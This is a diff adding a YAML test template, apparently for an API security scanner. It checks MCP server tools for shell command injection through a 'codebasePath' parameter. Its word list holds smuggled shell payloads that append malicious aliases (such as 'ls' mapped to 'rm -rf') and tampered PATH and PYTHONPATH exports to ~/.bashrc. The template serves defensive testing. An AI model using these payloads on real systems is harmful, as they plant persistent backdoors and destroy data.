@@ -1,0 +1,124 @@
+id: MCP_SHELL_CONFIGURATION_OVERRIDE_ATTACK
+info:
+  name: "MCP Shell Configuration Override Attack via Response"
+  description: >
+    Tests MCP server vulnerability where user input parameters are directly reflected in shell commands without proper sanitization, allowing attackers to override shell configurations and create persistent backdoors.
+  details: >
+    This attack exploits the direct reflection of user input in shell commands within MCP server tools. By injecting malicious shell configuration commands through vulnerable input parameters, attackers can override critical shell settings, create persistent backdoors, and establish long-term access to the system. The attack targets shell configuration files like .bashrc, .zshrc, and environment variables.
+  impact: >
+    A successful shell configuration override attack can lead to persistent system compromise, privilege escalation, and complete system takeover. Attackers can establish backdoors that survive system reboots, redirect system commands to malicious alternatives, and maintain long-term access to sensitive data and resources.
+  category:
+    name: MCP_MALICIOUS_CODE_EXECUTION
+    shortName: MCP_MALICIOUS_CODE_EXECUTION
+    displayName: MCP - Malicious Code Execution
+  subCategory: MCP_SHELL_CONFIGURATION_OVERRIDE
+  severity: CRITICAL
+  tags:
+    - mcp-security
+    - shell-configuration
+    - persistent-backdoor
+    - privilege-escalation
+    - command-injection
+    - configuration-override
+  references:
+    - "https://owasp.org/www-project-top-ten/2017/A1_2017-Injection"
+    - "https://cwe.mitre.org/data/definitions/78.html"
+    - "https://www.exploit-db.com/search?q=shell+configuration+override"
+  cwe:
+    - CWE-78
+    - CWE-77
+    - CWE-73
+    - CWE-269
+    - CWE-250
+  cve:
+    - CVE-2023-25826
+    - CVE-2023-41031
+    - CVE-2024-22422
+    - CVE-2024-21626
+
+attributes:
+  nature: INTRUSIVE
+  plan: PRO
+  duration: FAST
+
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+  method:
+    eq: POST
+  request_payload:
+    contains_all:
+      - jsonrpc
+      - method
+      - id
+    for_one:
+      key:
+        eq: codebasePath
+        extract: paramKey
+      value:
+        extract: paramValue
+
+wordLists:
+  shellConfigPayloads:
+    - '~; echo "alias ls=\\"rm -rf\\"" >> ~/.bashrc; echo "alias cd=\\"echo MALICIOUS\\"" >> ~/.bashrc; echo "alias sudo=\\"echo PWNED\\"" >> ~/.bashrc'
+    - '~; echo "export PATH=\\"/malicious/bin:$PATH\\"" >> ~/.bashrc; echo "export PYTHONPATH=\\"/evil/modules\\"" >> ~/.bashrc'
+
+execute:
+  type: single
+  requests:
+    - req:
+        - modify_body_param:
+            ${paramKey}: "${shellConfigPayloads}"
+
+validate:
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+    contains_either:
+      - "alias ls"
+      - "alias cd"
+      - "alias sudo"
+      - "export PATH"
+      - "export PYTHONPATH"
+      - "function ls"
+      - "function cd"
+      - "PS1="
+      - "export HISTFILE"
+      - "exec"
+      - "function whoami"
+      - "function id"
+      - "export TERM"
+      - "export SHELL"
+    not_contains:
+      - "Error"
+      - "Internal Server"
+      - "Failed"
+      - "Unauthorized"
+      - "access denied"
+      - "Forbidden"
+      - "Method Not allowed"
+      - "Gateway timeout"
+      - "request timeout"
+      - "server error"
+      - "server busy"
+      - "authentication error"
+      - "authorization error"
+      - "validation error"
+      - "Permission Denied"
+      - "invalid token"
+      - "token expired"
+      - "session expired"
+      - "session timeout"
+      - "unexpected error"
+      - "unable to process request"
+      - "bad request"
+      - "service unavailable"
+      - "account is locked"
+      - "account is blocked"
+      - "multiple failed attempts"
+      - "<html>"
+      - "</html>"
